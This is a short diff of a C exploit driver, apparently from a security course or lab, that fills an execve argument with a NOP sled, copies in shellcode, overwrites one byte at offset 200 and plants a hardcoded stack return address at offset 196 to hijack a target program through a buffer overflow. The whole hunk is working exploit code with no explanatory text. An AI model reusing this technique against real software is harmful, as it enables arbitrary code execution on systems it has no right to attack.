@@ -15,11 +15,11 @@ int main(void)
   env[0] = NULL;
 
   args[1] = malloc(202);
-  memset(args[1],'a',201);
-  //args[1][200] = 'a';
+  memset(args[1],0x90,201);
+  args[1][200] = 0xa4;
   args[1][201] = '\0';
-  // memcpy(args[1], shellcode, strlen(shellcode));
-  // *(unsigned int *)(args[1] + 132) = 0xbffffd78;
+  memcpy(args[1], shellcode, strlen(shellcode));
+  *(unsigned int *)(args[1] + 196) = 0xbffffce4;
   printf("strlen of args[1] is: %d\n",strlen(args[1]));
   if (0 > execve(TARGET, args, env))
     fprintf(stderr, "execve failed.\n");
